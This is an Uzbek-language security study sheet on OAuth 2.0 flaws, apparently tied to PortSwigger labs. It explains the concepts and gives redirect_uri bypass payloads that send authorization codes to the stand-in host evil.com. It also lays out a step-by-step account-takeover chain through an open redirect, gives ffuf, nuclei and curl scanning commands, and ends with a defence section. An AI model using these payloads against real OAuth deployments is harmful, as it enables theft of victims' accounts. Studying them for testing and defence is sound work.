# OAuth 2.0 Vulnerabilities

> Lab yechimlari (PortSwigger'ning 6 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
OAuth — "Login with Google/Facebook" kabi **delegatsiyalangan avtorizatsiya**: sayt (client)
foydalanuvchi nomidan provider'dan `code`/`token` oladi va shu bilan uni login qiladi. Bu oqimda
ko'p "ishonch nuqtasi" bor (`redirect_uri`, `state`, token, scope). Agar client/provider shulardan
birini noto'g'ri tekshirsa — sen `code`/`token`ni o'g'irlab yoki profilni majburan bog'lab, boshqa
odamning akkauntiga kirasan.

**Ildiz sabab:** OAuth murakkab oqim; dasturchilar `redirect_uri`ni qattiq tekshirmaydi, `state`ni
(CSRF himoya) tashlab ketadi, yoki implicit flow'da ma'lumotga ortiqcha ishonadi. Har bir
kelishmovchilik — token leak yoki forced linking yo'li.

## Turlari
- **redirect_uri manipulyatsiyasi** — validatsiyasiz/zaif match → code/token'ni attacker domeniga leak.
- **`state` yo'qligi (CSRF)** — forced OAuth profile linking (o'z akkauntingni qurbonga biriktirish).
- **Implicit flow token trust** — client token/email'ga ishonadi → email almashtirib boshqa user bo'lish.
- **Token leak via open redirect / proxy page / referer** — chain bilan access_token o'g'irlash.
- **OpenID dynamic client registration** — `logo_uri`/`jku` orqali SSRF.

## Oqibatlar (IMPACT)
- **To'liq account takeover** — qurbon akkauntiga kirish.
- `redirect_uri`/token leak → ATO; forced linking → admin akkauntni egallash.
- Dynamic registration SSRF → cloud metadata/IAM.
> Odatda **High/Critical**.

## Oqim (qisqa)
```
/authorize?client_id=..&redirect_uri=..&response_type=code&state=..
→ user rozi → redirect_uri?code=XYZ&state=..
→ backend /token (code+secret) → access_token → /userinfo
```

## Zaifliklar

### 1. redirect_uri manipulyatsiyasi (eng muhim)
```
redirect_uri=https://evil.com
redirect_uri=https://client.com.evil.com
redirect_uri=https://client.com@evil.com
redirect_uri=https://client.com/callback/../redirect?url=evil.com
redirect_uri=https://client.com//evil.com
# client'da open redirect bo'lsa:
redirect_uri=https://client.com/go?next=https://evil.com
```
> Code evil.com'ga leak → sen token'ga almashtirasan → ATO.

### 2. state yo'q / tekshirilmaydi → OAuth CSRF
Sen o'z `code`'ingni qurbon sessiyasiga biriktirasan → qurbon akkaunti sening ijtimoiy
akkauntingga bog'lanadi (account hijack).

### 3. Implicit flow token leak
`response_type=token` → token URL fragment'da → Referer/open redirect orqali o'g'irlash.

### 4. Account linking email ishonchi
```
IdP email'ini tekshirmasdan mavjud akkauntga bog'lasa →
victim@target.com bilan ro'yxatdan o'tib ATO
email_verified=false bo'lsa ham qabul qiladimi?
```

### 5. code reuse / PKCE yo'q
code 2-marta ishlaydimi? boshqa client_id bilan? PKCE (code_challenge) bormi?

## TOOLLAR

### Burp (manual) — OAuth oqimini kuzatish
```
Burp → HTTP history → /authorize, callback, /token ni kuzat → redirect_uri bilan o'yna
```
> OAuth'ni avtomat emas, qo'lda sinaysan. Har bir redirect_uri variantini Repeater'da urasan.

### curl — openid config o'qish
```bash
curl -s https://idp.target.com/.well-known/openid-configuration | jq
```
> Barcha endpoint (authorize, token, userinfo, jwks) manzilini bir joyda beradi.

### nuclei — ma'lum OAuth misconfig
```bash
nuclei -u https://target.com -t ~/nuclei-templates/http/misconfiguration/ -tags oauth,redirect
```
> Open redirect va ma'lum OAuth teshiklarini tez tekshiradi.

### Burp "Software Vulnerability Scanner" / manual redirect fuzz
```bash
ffuf -w redirect-bypass.txt -u "https://idp.target.com/authorize?client_id=X&redirect_uri=FUZZ&response_type=code" -mc 302 -fr "invalid"
```
> redirect_uri bypass variantlarini sinab, qaysi birida 302 (qabul qilindi) qaytishini topadi.

## ATO zanjiri (redirect_uri + open redirect)
```
1. client.com'da open redirect top (/go?url=)
2. redirect_uri=https://client.com/go?url=https://evil.com
3. authorize link'ni qurbonga bostir
4. code → client.com/go → evil.com?code=XYZ
5. code'ni token'ga almashtir → victim akkaunti
```

## PoC
redirect_uri bypass bilan code sening domeningga tushishini ko'rsat → ATO.

## Himoya
`redirect_uri` exact-match allowlist, `state` majburiy+tekshirish, PKCE, code bir martalik,
account linking'da `email_verified`+ownership, token endpoint'da redirect_uri+client_id qayta tekshir.
